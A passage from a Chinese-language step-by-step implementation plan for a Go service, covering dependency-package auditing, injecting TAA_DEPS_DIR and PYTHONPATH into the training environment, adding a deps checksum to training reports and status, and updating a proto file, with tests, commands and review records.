**清理语义的差异（有意为之）**：模型审计失败时调用 `cleanDirContents(dir)`——只清空内容、
保留目录本身，因为 `ModelDir` 是长期存在的固定路径。依赖目录是**内容寻址**的
`depsDir/<sm3>`，整目录即该版本的完整身份，因此这里用 `os.RemoveAll(depsDir)` 整体删除，
与 spec §6「不留半成品目录」一致。

**§9 要求"已知盲区需在实现中明示"，本任务必须补上这一条——此前没有任何 Task 覆盖它。**
Spec §9 末段写明两处盲区：fail-closed 静态扫描对 wheel 内的 `.so`/`.pyd` **二进制无效**
（引擎按扩展名跳过，`internal/codeaudit/rules.go:90`），以及完整性上**只有 SM3、没有签名验签**。
这两句必须出现在 `deps_audit.go` 里紧邻审计调用的位置，否则"同引擎、同策略"很容易被读成
"扫过了就等于安全了"。

写成 `runDepsAudit` 上方的英文注释（与仓库其余注释一致），要点三条：

1. 扫的是解包后的 wheel **内容**，不是安装后的 `.so`/`.pyd`——二进制层面的供应链风险不在覆盖范围内；
2. 完整性只有 SM3 内容寻址，**没有发布者签名**，信任模型与平台侧的既有约定一致；
3. 因此"审计通过"**不等于**"依赖集合可信"，它只意味着"在同一套静态规则下未命中"。

**只写注释，不要新增运行时检查、告警或阻断**——本节只要求"明示"；spec §13 的风险 1 与风险 3
已把缓解手段（依赖审计白名单、签名验签）明确留给后续 spec。

`internal/controller/import_processing.go` 中新增 `reportAuditScopedAsync`：把既有
`reportAuditAsync`（预审时测得 `:722`；**Task 9 已在 `:188` 插入 1 行，此数已下移，按符号名定位**）
的实现体抽出为带 scope 的版本，原函数委托：

```go
func (s *TAAState) reportAuditAsync(requestID, taskID string, code int, msg, report string) {
	s.reportAuditScopedAsync(requestID, taskID, code, msg, report, "")
}

// reportAuditScopedAsync 异步上报审计结果，scope 为空表示模型代码审计，为 "deps" 表示依赖包审计。
func (s *TAAState) reportAuditScopedAsync(requestID, taskID string, code int, msg, report, scope string) {
	s.mu.RLock()
	platformIP, dockerID := s.PlatformIP, s.DockerID
	s.mu.RUnlock()
	go func() {
		if err := ReportAuditScoped(context.Background(), platformIP, dockerID, requestID, taskID, code, msg, report, scope); err != nil {
			s.Logs.Add(LogWarn, "report", "上报审计结果失败: requestID=%s taskID=%s scope=%s err=%v", requestID, taskID, scope, err)
		}
	}()
}
```

保留 `reportAuditAsync` 原实现里的日志与错误处理细节；上面是形状，落地时以既有函数体为准做等价搬迁。

- [ ] **Step 4: 删除 Task 6 的最小 `runDepsAudit`**

`deps_import.go` 中 Task 6 添加的返回 **`false`**（fail-closed 桩）的最小 `runDepsAudit` 必须删除，避免重复定义
导致编译失败。

- [ ] **Step 5: 运行测试确认通过**

```bash
go test ./internal/controller/ -run 'TestRunDepsAuditRemovesDirOnFailure|TestProcessImportedDeps|TestAudit' -v
```

期望：新增测试 PASS，既有审计测试保持 PASS。

- [ ] **Step 6: 提交**

```bash
git add internal/controller/deps_audit.go internal/controller/deps_import.go internal/controller/import_processing.go internal/controller/deps_import_test.go
git commit -m "feat(deps): audit dependency packages fail-closed with deps scope"
```

---

## Task 9: 训练环境注入 `TAA_DEPS_DIR` 与前置 `PYTHONPATH`

**Files:**
- Create: `internal/controller/deps_env.go`
- Modify: `internal/controller/import_processing.go:178` 附近
- Test: `internal/controller/deps_env_test.go`

- [ ] **Step 1: 写失败测试**

创建 `internal/controller/deps_env_test.go`：

```go
package controller

import "testing"

func TestApplyDepsEnvPreservesPlatformPythonPath(t *testing.T) {
	env := map[string]string{"PYTHONPATH": "/platform/lib", "CUDA_VISIBLE_DEVICES": "0"}

	got := applyDepsEnv(env, "/opt/taa/model-deps/abc")

	if got["PYTHONPATH"] != "/opt/taa/model-deps/abc:/platform/lib" {
		t.Fatalf("PYTHONPATH = %q, want deps dir prepended to the platform value", got["PYTHONPATH"])
	}
	if got["TAA_DEPS_DIR"] != "/opt/taa/model-deps/abc" {
		t.Fatalf("TAA_DEPS_DIR = %q", got["TAA_DEPS_DIR"])
	}
	if got["CUDA_VISIBLE_DEVICES"] != "0" {
		t.Fatal("unrelated env entries must be preserved")
	}
}

func TestApplyDepsEnvWithoutPlatformPythonPath(t *testing.T) {
	got := applyDepsEnv(map[string]string{}, "/opt/taa/model-deps/abc")

	if got["PYTHONPATH"] != "/opt/taa/model-deps/abc" {
		t.Fatalf("PYTHONPATH = %q, want the deps dir alone (no trailing colon)", got["PYTHONPATH"])
	}
}

func TestApplyDepsEnvNoopWhenNoDeps(t *testing.T) {
	env := map[string]string{"PYTHONPATH": "/platform/lib"}

	got := applyDepsEnv(env, "")

	if _, ok := got["TAA_DEPS_DIR"]; ok {
		t.Fatal("TAA_DEPS_DIR must not be set when no dependency package is active")
	}
	if got["PYTHONPATH"] != "/platform/lib" {
		t.Fatalf("PYTHONPATH = %q, must be untouched", got["PYTHONPATH"])
	}
}

func TestApplyDepsEnvDoesNotMutateInput(t *testing.T) {
	env := map[string]string{}

	_ = applyDepsEnv(env, "/deps/abc")

	if len(env) != 0 {
		t.Fatalf("input map was mutated: %#v", env)
	}
}
```

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/controller/ -run TestApplyDepsEnv -v
```

期望：编译失败 `applyDepsEnv undefined`。

- [ ] **Step 3: 实现纯函数**

创建 `internal/controller/deps_env.go`：

```go
package controller

import "strings"

// applyDepsEnv 把当前生效的依赖目录注入到训练环境：设置 TAA_DEPS_DIR，并把依赖目录
// 前置到 PYTHONPATH 之前（而不是覆盖），从而保留平台在 runtimeConfig.env 里给出的
// PYTHONPATH 条目。
//
// depsDir 为空表示没有生效的依赖包，此时原样返回一份副本，不注入任何键——这是
// 「未导入依赖时训练环境逐字节不变」这一保证的落点。
//
// 返回新 map，不修改入参。
func applyDepsEnv(env map[string]string, depsDir string) map[string]string {
	out := make(map[string]string, len(env)+2)
	for k, v := range env {
		out[k] = v
	}
	depsDir = strings.TrimSpace(depsDir)
	if depsDir == "" {
		return out
	}

	out["TAA_DEPS_DIR"] = depsDir
	if existing := strings.TrimSpace(out["PYTHONPATH"]); existing != "" {
		out["PYTHONPATH"] = depsDir + ":" + existing
	} else {
		out["PYTHONPATH"] = depsDir
	}
	return out
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
go test ./internal/controller/ -run TestApplyDepsEnv -v
```

期望：四个用例 PASS。

- [ ] **Step 5: 接入训练路径**

`internal/controller/import_processing.go` 中，`executeTraining` 里调用 `parseRuntimeConfig`
之后（`:178-190` 一带）：

```go
	cfg, env, err := parseRuntimeConfig(runtimeConfigRaw)
	if err != nil {
		...
	}
	env = applyDepsEnv(env, s.currentDepsDir())
```

`currentDepsDir()` 的读取必须在 `parseRuntimeConfig` 之后、`runRuntimeConfigWithControl`
（`:471`）之前，确保注入生效。

- [ ] **Step 6: 写回归测试（未导入依赖时环境不变）**

追加到 `internal/controller/deps_env_test.go`：

```go
func TestTrainingEnvUnchangedWithoutDeps(t *testing.T) {
	state, _ := setupTestState(t)

	if got := state.currentDepsDir(); got != "" {
		t.Fatalf("currentDepsDir = %q before any deps import, want empty", got)
	}

	base := map[string]string{"OMP_NUM_THREADS": "8"}
	got := applyDepsEnv(base, state.currentDepsDir())

	if len(got) != len(base) {
		t.Fatalf("env grew from %d to %d entries without an imported dependency package", len(base), len(got))
	}
	for k, v := range base {
		if got[k] != v {
			t.Fatalf("env[%q] = %q, want %q", k, got[k], v)
		}
	}
}
```

- [ ] **Step 7: 运行测试与训练相关回归**

```bash
go test ./internal/controller/ -run 'TestApplyDepsEnv|TestTrainingEnvUnchangedWithoutDeps' -v
go test ./internal/controller/
```

期望：前者四个新用例 + 回归用例 PASS；后者整个 controller 包 PASS（这是训练路径的真实回归——
`TestExecuteTraining` **在本仓库不存在**，按该名字 `-run` 会静默匹配零个用例并退出 0，制造假覆盖）。

- [ ] **Step 8: 提交**

```bash
git add internal/controller/deps_env.go internal/controller/deps_env_test.go internal/controller/import_processing.go
git commit -m "feat(deps): inject TAA_DEPS_DIR and prepend PYTHONPATH for training"
```

---

### Task 9 规范审查发现（2026-10-08，已改入正文，实现者无需再判断）

审查结论是**合规**（spec §7 五条要求逐条吻合，无功能性超建；三个独立变异——尾冒号守卫、前置改覆盖、
删空值早返回——全部被现有用例抓住，测试非空覆盖）。

但审查者点出一处**本计划相对 spec 的欠规格**，已判定为必修：

| # | 级别 | 缺陷 | 依据 |
| :--- | :--- | :--- | :--- |
| K | 覆盖 | **spec §12 的「训练注入：子进程环境含 `TAA_DEPS_DIR` 与前置的 `PYTHONPATH`，且平台在 `runtimeConfig.env` 中给出的 `PYTHONPATH` 被保留而非覆盖」这条断言不存在。** 把 `import_processing.go:188` 整行删掉，Step 6/7 的 5 个用例**全部照过** —— 本任务唯一的功能性接线没有任何自动化保护，CI 抓不到"注入被删/写错位置/结果半路被丢弃" | Step 6/7 只要求了纯函数回归用例；实现者照做，不是漏做 |

**补法（Step 6 之后新增一个用例，仍放 `deps_env_test.go`）**：走**真实**的
`processImportedResource`，不要直接调 `executeTraining`（那测的是测试自己的接线，不是 `:188`）。
到 `:188` 的前置条件（已逐行核实）：

```go
state, _ := setupTestState(t)   // fixture 已给 ModelDir/DepsDir/ResultCheck:false
state.ModelImported = true      // 否则 :158 的 if !modelImported 提前 return
state.saveDepsSuccess("cafebabe", map[string]any{"size": int64(5), "algorithm": "sm3", "value": "cafebabe"})
state.RuntimeConfig = `{"commands":["env > envdump.txt"],"env":{"PYTHONPATH":"/platform/lib"}}`
```

- `isModel` 必须为 **false**：`:140-144` 的 `if isModel` 会提前 return，`:188` 在**数据下发触发训练**
  那条分支里（`:146` 起）。
- 归档用**明文**小 tar.gz，直接复用同包已提交的 `buildTestArchive`（`map[string]string{"data.txt": "x"}`）。
- 命令经 `/bin/sh -c` 执行、cwd 为 `ModelDir`（`executor.go:49`），故 `envdump.txt` 落在
  `state.Security.ModelDir` 下，读它断言：dump 含 `TAA_DEPS_DIR=<depsRoot>/cafebabe`；
  `PYTHONPATH` 行等于 `<depsRoot>/cafebabe:/platform/lib`（**这条才证明平台值被保留而非覆盖**）。
- 再加一条**负向对照**：同样配置但不导入依赖，dump 里**不得**出现 `TAA_DEPS_DIR`——直接对应
  §12 的"未导入依赖时训练环境逐字节一致"。

**变异要求**：删掉 `:188` 后该用例必须 FAIL。

**若该路径需要实现者无法在不碰其它文件的前提下构造的 fixture，就停下来报告阻塞点**，
不得绕开 `:188` 写一个假接线用例——那比没有更糟。

---

### Task 9 闭环记录（2026-10-08，K 项闭合 + 质量审查 APPROVE）

审查对象：`6b97b76`（纯函数 + 注入接线）、`399d3b0`（K 项补测）、`1583361`（质量审查收尾）。

**K 的闭合靠两次变异，两次都还原并留痕**（这是本任务唯一的承重证据，故逐字记录）：

| 变异 | 预期 | 实测 |
| :--- | :--- | :--- |
| 删 `import_processing.go:188`（整行） | 新增的正向用例必挂 | `TestTrainingSubprocessEnvCarriesDepsDir` **FAIL** @ `deps_env_test.go:180`，`TAA_DEPS_DIR = ""`；负向对照与四个纯函数用例**全过** |
| `deps_env.go` 的「前置」改为「覆盖」 | 两处断言均可判别 | 纯函数用例 `:16` 与子进程用例 `:183` **双 FAIL**，消息指明 "platform value preserved, not overwritten" |

第一行同时复现了 K 的**前提**：四个纯函数用例 + 一个回归用例在删掉 `:188` 后照过——证明 K 是真实缺口而非重述。
两次变异后的 blob 均与 HEAD 相等（`b5697d0…` / `0b8cbab…`），`git log --all --find-object` 为空。

**质量审查** APPROVED，无 Critical / Important，3 条 Minor 已全部落地（`1583361`，纯注释 + 一个 no-op 删除 + 断言形状）：

1. `deps_env.go` 的 doc 补上**尾冒号规则**——它是本文件唯一带安全含义的决策（尾随空条目会让 Python 把 cwd 加进 `sys.path`，spec §7），此前只活在一句测试失败信息里。
2. 删掉 `deps_env_test.go` 里 no-op 的 `os.MkdirAll(GetDepsDir())`（夹具已建该目录），改为在 `runTrainingWithDeps` 的 doc 里写明**依赖目录刻意不落盘**——注入是纯字符串操作，本用例断言的是子进程环境形状而非磁盘可导入性。
3. 正向断言改用 `v, ok :=` 并在消息里带 `present=%v`，使失败能区分「键缺失」与「值为空」。

**经论证不改（记录理由）**：

- `import_processing.go:189` 的 `len(cfg.Commands) == 0` 是**既有死代码**（`runtime/config.go:58-60` 已对空 commands 报错），与本任务无关，不动——只作为读者可能在此处停顿的提示。
- `unsetAmbientEnv` 只 unset `TAA_DEPS_DIR` 而不 unset `PYTHONPATH`：**正确**。`MergedRuntimeEnv` 以 `os.Environ()` 打底、`userEnv` 后写覆盖，故宿主 `PYTHONPATH` 必被 `runtimeConfig.env` 的值确定性覆盖，不存在假通过口；而 `TAA_DEPS_DIR` 若不 unset，宿主残留值会经 `os.Environ()` 漏进 dump，把负向断言变成假通过——helper 防的正是这一处。
- 纯函数用例与子进程用例的语义重叠**不合并**：前者毫秒级失败且能指认是 trim / 尾冒号 / 不变量哪一条错了，后者只在接线层面说话，合并必然失去一侧。

**承重前提已复核**：注入路径全仓唯一——`executeTraining` 只有 `import_processing.go:217` 一个调用点，`runRuntimeConfigWithControl` 在 controller 内只有 `:475` 一个；`handler_task.go:235` 的 `parseRuntimeConfig` 丢弃 env（`cfg, _, err`），只做校验不触发训练，不构成漏注入旁路。

---

## Task 10: `deps_checksum` 进训练报告，`status` 暴露依赖状态

**Files:**
- Modify: `internal/runtime/report.go:42,46,81-88`
- Modify: `internal/controller/import_processing.go:1006-1012`
- Modify: `internal/controller/handler_system.go:57-73`
- Modify: `internal/coordinator/flow_training.go:219`
- Modify: `internal/runtime/report_test.go`（**既有** `TestBuildTrainingReport:57` 的 10 参调用要补 1 个 `nil`，见 Step 3）
- Modify: `internal/controller/import_processing_report_test.go`（既有 `:54` 的 11 参调用要补 1 个 `nil`，见 Step 4）

> **行号锚点已核实（2026-10-08 预审）**：以上四处行号均已逐条实测命中（`flow_training.go:219` 正是
> `runtime.BuildTrainingReport(...)` 调用行；`import_processing.go:1011` 正是 `buildTrainingReport`
> 里的委托调用行；`handler_system.go:57-73` 正是整个 `statusHandler`）。
>
> **但 Task 9 会在 `import_processing.go:178` 附近插入 1–2 行**，因此 `:1006-1012` 届时会下移。
> 定位 `buildTrainingReport` 时**按符号名找，不要按行号**。其余三处不受 Task 9 影响。
>
> **命名约定（两处不同，不要统一）**：`status` 响应新增 **camelCase** 的 `depsImported` / `depsHash`
> （与同一对象里既有的 `modelImported`/`trainingRunning`/`currentOp` 对齐）；训练报告里则是
> **snake_case** 的 `deps_checksum`（与同处的 `model_checksum`/`data_checksum` 对齐，平台 Schema 1.0
> 的既有约定）。spec §5 初稿把前者误写成 snake_case，已订正。

> **编码前预审发现（2026-10-08，已直接改入正文，实现者无需再判断）**：
>
> 1. **`BuildTrainingReport` 还有一个调用方被漏掉了**：`internal/controller/import_processing_report_test.go:54`
>    直接调用该函数（传 10 个实参）。签名一改它就编译不过。已加入 Files 与 Step 11 的 `git add`
>    ——漏掉的话不只是构建失败，`git add` 的显式 pathspec 也会把修复后的该文件留在工作区，
>    产出一个「编译不过的历史提交」。
>    另核实：**非测试调用方只有一个**（`import_processing.go` 的 `buildAndSaveTrainingReport` 内，
>    即预审时测得的 `:969`）。Step 4 点名的 `reportTrainingFailureFromResult` 并不直接调用它，
>    故 Step 4 的实际改动面就是这一处 + 委托函数。
> 2. **Step 6 的测试要 `encoding/json`，而 `deps_import_test.go` 里没有这个 import。**
>    Task 6 给该文件加的 import 恰恰**不含** `encoding/json`（它加的是 `archive/tar`、`compress/gzip`、
>    `os`、`path/filepath`、`sort`）。必须补 `"encoding/json"`，否则该测试编译失败。
> 3. **Step 5/Step 10 原写 `go build ./...` 与 `go test ./...`，在本检出必然失败**，且与本任务无关
>    （见文件头「已知遗留」：`models/audit/holdout-sources/semgrep-rules-develop/` 无自己的 `go.mod`）。
>    照原文执行会得到一个假的「任务失败」信号。已改为窄范围命令。

---

### Task 10 编码前预审·第二轮（2026-10-08，逐符号核对）

**(Y) 漏掉的调用方：`internal/runtime/report_test.go:57`——危害是"假失败"，不是"少改一行"。**

签名变更的全部调用方（实测枚举，大小写不敏感地 grep 过 `[Bb]uildTrainingReport(`）：

| # | 调用点 | 实参 | 计划是否覆盖 |
| :--- | :--- | :--- | :--- |
| 1 | `internal/runtime/report.go:42`（`BuildCrashFailureReport` 内） | 10 | ✅ Step 3 |
| 2 | `internal/runtime/report_test.go:57`（**既有** `TestBuildTrainingReport`） | 10 | ❌ **原先完全没写** |
| 3 | `internal/coordinator/flow_training.go:219` | 10 | ✅ Step 3 |
| 4 | `internal/controller/import_processing.go:1015`（委托 `buildTrainingReport` 内） | 10 | ✅ Step 3 |
| 5 | `internal/controller/import_processing.go:973`（`buildAndSaveTrainingReport` 内） | 11 | ✅ Step 4 |
| 6 | `internal/controller/import_processing_report_test.go:54`（**既有**用例） | 11 | ⚠️ 见 (AA) |

第 2 条是**同一测试包**里的既有调用。不补 `nil` 则 `go test ./internal/runtime/` 编译失败，
而 Step 5/Step 10 期望"全部 PASS"——实现者会看到一个与本任务无关的编译错误，最坏情况下
去怀疑自己的签名改法。已写入 Step 3。

**(Z) Step 4 自称两处调用点，其中 `reportTrainingFailureFromResult` 并不是调用方。**

`reportTrainingFailureFromResult`（`:913`）调用的是 `buildAndSaveTrainingReport`（`:917`），
**从不直接调用 `buildTrainingReport`**。这与本任务上方预审发现 1 的结论直接矛盾——发现写对了，
正文没跟着改。已订正 Step 4，只留 `:973` 一处，并写明 `reportTrainingFailureFromResult` 一行不用改。

**(AA) 发现 1 声称"已加入 Files"，但 Files 块里并没有那个文件，Step 4 也没给补 `nil` 的指令。**

原文只在 Step 11 的 `git add` 里列了 `internal/controller/import_processing_report_test.go`。
`git add` 一个**没被修改过**的文件不会报错，所以这个疏漏不会自我暴露，只会留下一个
"该包编译不过"的历史提交。已把两个测试文件补进 Files 块，并在 Step 3/Step 4 各给出逐字的补参指令。

**(BB) 订正预审发现 2：`encoding/json` 现在已在 `deps_import_test.go` 里，`codeaudit` 也是——不要再补。**

预审发现 2 写在 Task 6 之后、Task 7 之前，当时该文件的 import 块确实不含 `encoding/json`
（实测为 `archive/tar, compress/gzip, errors, net/http, net/http/httptest, os, path/filepath, sort,
testing, time`）。**Task 7 已经把它加进去了**（`b3eee6e`：该文件新加的 httptest 处理器要用
`json.NewDecoder`），同时加进的还有 `taa/internal/codeaudit`。当前 HEAD 的 import 块实测为：

```
archive/tar, compress/gzip, encoding/json, errors, net/http, net/http/httptest,
os, path/filepath, sort, testing, time, taa/internal/codeaudit
```

**因此 Step 6 不需要补任何 import，照原指令补会得到重复 import 的编译失败。**
这与 Task 7 那条"`context` 早已 import、再加就重复导入"是同一型缺陷。结论要一般化：
**本计划的预审结论会随后续 Task 落地而过期；凡"某文件缺某符号"的断言，实现者一律以工作区实测为准。**

经核实为正确、记录在此以免被"顺手改坏"：

- **`s.getDepsChecksum()` 已存在**（`deps_state.go:36`），自己取 `RLock`、返回**副本**，且在
  `DepsChecksum == nil` 时返回 `nil`。后一点是承重的：`BuildTrainingReport` 里
  `if depsChecksum != nil` 守卫因此使**未导入依赖时报告里不出现 `deps_checksum` 键**，
  正是 §12「未导入依赖时训练环境与报告与改动前一致」所要求的。Step 4 直接用它，不要另写取数逻辑。
- **Step 8 读的是裸字段而不是 `getDepsChecksum()`/`currentDepsDir()`，这是对的。**
  `statusHandler` 在 `s.mu.RLock()` 内取数（`handler_system.go:58-63`），而 `getDepsChecksum`
  与 `currentDepsDir` **自己会再取一次锁**（`deps_state.go:37`、`:55`）；在持有读锁时调用它们，
  一旦有写者在等待即可能自锁。Step 8 给的写法在同一把读锁内读 `s.DepsImported`/`s.DepsHash`
  裸字段，正确且与原 handler 风格一致，**不要"顺手"改成调 those helper**。
- Step 8 的替换块与 `handler_system.go:57-73` 的**现状逐字吻合**（现状为
  `phase/modelImported/trainingRunning/currentOp` 五项 + `logCount`），新增两项插在
  `modelImported` 之后，键名 camelCase 与既有键对齐。
- `runtime/report.go` 的 `dataChecksum` 分支在 `:86-87`（计划写 `:86-88`，含闭合花括号，一致）；
  `BuildTrainingReport` 声明在 `:46`；`BuildCrashFailureReport` **声明**在 `:32`、其
  `return BuildTrainingReport(...)` 在 `:42`——Files 块写的 `:42` 指的是这一行，正确。
- controller 侧还有一个**同名包装** `BuildCrashFailureReport`（`import_processing.go:1006`），
  它转发给 `runtime.BuildCrashFailureReport`，**签名不变**（本任务只改 `BuildTrainingReport`），
  故无需改动，计划也没要求改——正确。
- Step 6 的两个测试助手都存在：`setupTestServer`（`handler_test.go:105`）、`postJSON`
  （`handler_test.go:146`）；`saveDepsSuccess(hash string, checksum map[string]any)`
  （`deps_state.go:11`）与 Step 6 的调用形式一致。
- 预审发现 2 属实：`deps_import_test.go` 的 import 块实测为
  `archive/tar, compress/gzip, errors, net/http, net/http/httptest, os, path/filepath, sort, testing, time`
  ——**确实没有 `encoding/json`**，Step 6 必须补。
- Test: `internal/runtime/report_test.go`、`internal/controller/handler_test.go` 风格的状态测试

- [ ] **Step 1: 写失败测试**

追加到 `internal/runtime/report_test.go`：

```go
func TestBuildTrainingReportIncludesDepsChecksum(t *testing.T) {
	startedAt := time.Date(2026, 10, 8, 1, 0, 0, 0, time.UTC)
	finishedAt := startedAt.Add(3 * time.Minute)

	depsChecksum := map[string]any{"size": int64(42), "algorithm": "sm3", "value": "deps-hash"}

	report, err := BuildTrainingReport("task-deps", startedAt, finishedAt, "succeeded", 0, "",
		nil, nil, depsChecksum, nil, nil)
	if err != nil {
		t.Fatalf("BuildTrainingReport: %v", err)
	}

	task, ok := report["training_task"].(map[string]any)
	if !ok {
		t.Fatalf("training_task missing: %#v", report)
	}
	if task["deps_checksum"] == nil {
		t.Fatalf("deps_checksum missing from training_task: %#v", task)
	}
}
```

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/runtime/ -run TestBuildTrainingReportIncludesDepsChecksum -v
```

期望：编译失败（参数个数不匹配）。

- [ ] **Step 3: 扩展报告构造**

`internal/runtime/report.go` 的 `BuildTrainingReport`（`:46`）：

- 参数表在 `dataChecksum map[string]any,` 之后插入 `depsChecksum map[string]any,`
- 在 `if dataChecksum != nil { dataset["checksum"] = dataChecksum }`（`:86-88`）之后新增：

```go
	if depsChecksum != nil {
		trainingTask["deps_checksum"] = depsChecksum
	}
```

- `BuildCrashFailureReport`（`:42`）的调用同步改为传 `nil`：

```go
	return BuildTrainingReport(taskID, startedAt, finishedAt, "failed", 137, failureReason, modelChecksum, dataChecksum, nil, nil, nil)
```

- `internal/runtime/report_test.go:57` 的**既有**用例 `TestBuildTrainingReport` 传的是 **10 个实参**
  （`modelChecksum, dataChecksum, trainingResult, codeauditSection` 四个 map 收尾），签名加参后
  **同一测试包即编译失败**。在 `dataChecksum` 之后补一个 `nil`（该用例不涉及依赖，补 `nil` 不会
  改变它任何既有断言——`if depsChecksum != nil` 守卫保证 `deps_checksum` 键不出现）：

```go
	report, err := BuildTrainingReport("task-001", startedAt, finishedAt, "succeeded", 0, "", modelChecksum, dataChecksum, nil, trainingResult, codeauditSection)
```

  漏掉这一处的后果不是"少改一行"，而是 Step 5/Step 10 的 `go test ./internal/runtime/` 直接编译失败，
  表现为一个**与本任务无关的假失败**。

- `internal/coordinator/flow_training.go:219` 同步插入 `nil`：

```go
	report, _ := runtime.BuildTrainingReport(record.TaskID, startedAt, finishedAt, status, exitCode, failureReason, c.phaseState.ModelChecksum(), c.phaseState.DataChecksum(), nil, trainResult, auditSection)
```

该执行路径没有依赖概念，因此传 `nil`——其结果是该路径的报告不含 `deps_checksum`，
属于本计划内的已知遗留，已在文件头「已知遗留」一节记录。

- `internal/controller/import_processing.go:1011` 的委托函数 `buildTrainingReport`
  参数表同样插入 `depsChecksum map[string]any,` 并透传。

- [ ] **Step 4: 训练路径传入真实 checksum**

**只有一处真实调用点。** `internal/controller/import_processing.go` 的 `buildAndSaveTrainingReport`
（函数声明在 `:956`，按符号名定位）内部 `:973` 的那次 `buildTrainingReport(...)` 调用，在
`dataChecksum` 之后插入 `s.getDepsChecksum()`：

```go
	report, err := buildTrainingReport(taskID, startedAt, finishedAt, status, exitCode, failureReason, modelChecksum, dataChecksum, s.getDepsChecksum(), trainingResult, audit, includeAudit)
```

> **不要把 `reportTrainingFailureFromResult` 算作调用方。** 它在 `:913`，调用的是
> `buildAndSaveTrainingReport`（`:917`），**从不直接调用 `buildTrainingReport`**；它经由前者自动
> 获得依赖 checksum，本身一行都不用改。本步原写"`buildAndSaveTrainingReport` 与
> `reportTrainingFailureFromResult` 两处"，与本任务上方预审发现 1 的结论**自相矛盾**，已订正。

**同步修既有测试调用。** `internal/controller/import_processing_report_test.go:54` 的
`buildTrainingReport(...)` 传 **11 个实参**：`:61` 是 model map、`:62` 是 data map、`:63` 起是
`trainingResult, audit, true`。在 `:62` 的 `dataChecksum` 字面量之后补一个 `nil`：

```go
		map[string]any{"algorithm": "sm3", "value": "data-archive-digest", "size": int64(934)},
		nil,
		trainingResult,
```

不补则 `internal/controller` 测试包编译失败，Step 5/Step 10 同样得到一个假失败。该用例的既有断言
（`dataset.checksum` 的 algorithm/value/size 三连、`data_structure` 的两处否定断言）全部不受影响——
补的是 `depsChecksum=nil`，`if depsChecksum != nil` 守卫使它不进报告。

- [ ] **Step 5: 运行测试确认通过**

```bash
go build ./cmd/... ./internal/... ./pkg/... && go test ./internal/runtime/ ./internal/controller/ ./internal/coordinator/ -count=1
```

期望：全部 PASS。

> **不要用 `go build ./...`**：本检出有一个与本任务无关的 baseline 失败
> （`models/audit/holdout-sources/semgrep-rules-develop/` 没有自己的 `go.mod`，因而属于根模块，
> 被 `./...` 扫到）。详见文件头「已知遗留」。

- [ ] **Step 6: 写状态接口测试**

追加到 `internal/controller/deps_import_test.go`：

```go
func TestStatusReportsDepsState(t *testing.T) {
	state, server := setupTestServer(t)
	state.saveDepsSuccess("cafebabe", map[string]any{"size": int64(5), "algorithm": "sm3", "value": "cafebabe"})

	resp := postJSON(t, server.URL+"/v1/taa/status", map[string]any{})
	defer resp.Body.Close()

	var body struct {
		Result map[string]any `json:"result"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if body.Result["depsImported"] != true {
		t.Fatalf("depsImported = %v, want true", body.Result["depsImported"])
	}
	if body.Result["depsHash"] != "cafebabe" {
		t.Fatalf("depsHash = %v, want cafebabe", body.Result["depsHash"])
	}
}
```

- [ ] **Step 7: 运行确认失败**

```bash
go test ./internal/controller/ -run TestStatusReportsDepsState -v
```

期望：FAIL（`depsImported` 为 `<nil>`）。

- [ ] **Step 8: 暴露状态字段**

`internal/controller/handler_system.go` 的 `statusHandler`（`:57-73`）中，取数与响应各加两处：

```go
	s.mu.RLock()
	phase := s.CurrentPhase
	modelImported := s.ModelImported
	depsImported := s.DepsImported
	depsHash := s.DepsHash
	trainingRunning := s.TrainingRunning
	currentOp := s.effectiveOpLocked()
	s.mu.RUnlock()

	writeEnvelope(w, http.StatusOK, "ok", map[string]any{
		"phase":           phase,
		"phaseName":       phaseName(phase),
		"modelImported":   modelImported,
		"depsImported":    depsImported,
		"depsHash":        depsHash,
		"trainingRunning": trainingRunning,
		"currentOp":       currentOp,
		"logCount":        s.Logs.Count(),
	}, 0)
```

- [ ] **Step 9: 运行测试确认通过**

```bash
go test ./internal/controller/ -run 'TestStatus' -v
```

期望：PASS。

- [ ] **Step 10: 全量测试与构建**

```bash
go build -o bin/taa ./cmd/taa && go build -o bin/platform-mock ./tools/platform-mock/cmd/platform-mock && go test ./internal/... ./pkg/... -count=1
```

期望：两个二进制构建成功，全部测试 PASS。**`go test ./...` 在本检出不可用**（同 Step 5 的
baseline 说明），用 `./internal/... ./pkg/...` 覆盖全部与被改动代码相关的包。

- [ ] **Step 11: 提交**

```bash
git add internal/runtime/report.go internal/runtime/report_test.go internal/coordinator/flow_training.go internal/controller/import_processing.go internal/controller/import_processing_report_test.go internal/controller/handler_system.go internal/controller/deps_import_test.go
git commit -m "feat(deps): expose deps checksum in training report and status"
```

---

## Task 11: 同步 `api/proto/taa.proto`（设计稿一致性）

**Files:**
- Modify: `api/proto/taa.proto:31-34`、`:56-59`、`:74-81`、`:225-232`

spec §8 末条要求 proto 设计稿与实际 HTTP 接口保持一致。该文件**没有 gRPC 实现**
（`cmd/` 下只有 `main.go`），因此本任务只改文档、不加代码、不加测试——它的价值是让
读 proto 的人不会以为依赖下发不存在。

- [ ] **Step 1: 新增两个 rpc**

`service TAAService` 中（`:34` 的 `ImportModel` 之后、`:58` 的 `ReportModelImport` 之后）各插一行：

> 订正（2026-10-08，Task 11 实现期）：此处初稿写作 `TaaService`，**文件里实际是 `TAAService`**
> （`api/proto/taa.proto:17`）。同文件另有 `service PlatformCallbackService`（`:50`），
> 两个 rpc 属于前者。`ReportModelImport` 的锚点实测也是 `:58`（初稿写 `:56`）。

```proto
  rpc ImportDeps(ImportDepsRequest) returns (ApiResponse);
```

```proto
  rpc ReportDeps(ReportDepsRequest) returns (ReportDepsResponse);
```

- [ ] **Step 2: 新增请求/响应消息**

紧跟 `message ReportModelImportResponse { ... }`（`:219-223`）之后插入：

```proto
message ImportDepsRequest {
  string resource_url = 1;
  string task_id = 2;
  string request_id = 3;
}

message ReportDepsRequest {
  string docker_id = 1;
  string request_id = 2;
  string task_id = 3;
  int32 code = 4;
  string msg = 5;
  Checksum checksum = 6;
}

message ReportDepsResponse {
  string msg = 1;
  int32 error = 2;
  ReportResult result = 3;
}
```

`ImportDepsRequest` 刻意**不含** `runtime_config`：依赖包不参与训练配置（对照
`ImportModelRequest` 的 `:123-128`）。

- [ ] **Step 3: 补 `scope` 与状态位**

`message ReportAuditRequest`（`:225-232`，计划初稿写 `:224-231`，实测差一行）末尾新增：

```proto
